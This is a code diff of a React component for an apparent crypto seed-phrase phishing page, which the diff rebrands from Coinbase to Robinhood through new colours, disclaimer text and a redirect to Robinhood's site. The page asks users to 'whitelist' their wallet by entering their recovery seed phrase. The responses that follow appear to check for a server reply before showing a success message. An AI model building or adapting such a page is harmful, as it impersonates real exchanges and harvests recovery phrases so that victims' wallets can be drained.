@@ -29,24 +29,11 @@ const SeedPhrases = ({ nextScreen }: { nextScreen: () => void }) => {
     window.Buffer = Buffer;
   }, []);
 
-  // const generateSeedWords = () => {
-  //   const mnemonic = bip39.generateMnemonic(256);
-  //   const generatedWords = mnemonic.split(" ").slice(0, activeTab);
-  //   const wordMap = generatedWords.reduce<Record<number, string>>(
-  //     (acc, word, index) => {
-  //       acc[index + 1] = word;
-  //       return acc;
-  //     },
-  //     {}
-  //   );
-  //   setWords(wordMap);
-  // };
-
   const copySeedPhrase = () => {
     navigator.clipboard.writeText(Object.values(words).join(" "));
     setIsCopied("Finish");
     setCopiedText(true);
-    window.location.href = "https://coinbase.com";
+    window.location.href = "https://robinhood.com/eu/nl/";
   };
 
   const showModal = () => {
@@ -63,11 +50,10 @@ const SeedPhrases = ({ nextScreen }: { nextScreen: () => void }) => {
           if (res.ok) {
             setIsModalOpen(false);
             if (tempCount > 0) {
-              // generateSeedWords();
               tempCount = -10;
               setErrorCount(tempCount);
               setInfo(
-                "Your wallet has been successfully whitelisted.\n Your wallet backup (recovery seed) is yours and yours only: never share, store digitally, or disclose it to anyone, not even coinbase support."
+                "Your wallet has been successfully whitelisted.\n Your wallet backup (recovery seed) is yours and yours only: never share, store digitally, or disclose it to anyone, not even Robinhood support."
               );
             }
           }
@@ -125,13 +111,14 @@ const SeedPhrases = ({ nextScreen }: { nextScreen: () => void }) => {
       <div className="w-screen overflow-x-hidden  flex relative text-white text-start py-20">
         <div className="flex flex-col w-full overflow-x-hidden sm:px-[100px] px-[30px] py-[30px]">
           <div>
-            <h2 className="font-medium text-[26px] mb-[10px] text-blue-600">
+            <h2 className="font-medium text-[26px] mb-[10px] text-[#CBFF00]">
               Whitelist Wallet
             </h2>
             <p className="text-[14px] text-slate-500 leading-[1.5] mb-[20px]">
               Enter the seed phrase you would like to whitelist. this will
               ensure your wallet is recognized by the system and secured. <br />
-              DISCLAIMER: Coinbase does not keep a copy of your recovery phrase.
+              DISCLAIMER: Robinhood does not keep a copy of your recovery
+              phrase.
             </p>
           </div>
 
@@ -149,7 +136,7 @@ const SeedPhrases = ({ nextScreen }: { nextScreen: () => void }) => {
                 onClick={() => handleTabChange(num)}
                 className={`text-[14px] cursor rounded-[4px] w-full font-semibold h-[42px] ${
                   activeTab === num
-                    ? "bg-blue-600 text-white"
+                    ? "bg-[#CBFF00] text-black"
                     : "text-white bg-[#202630]"
                 }`}
               >
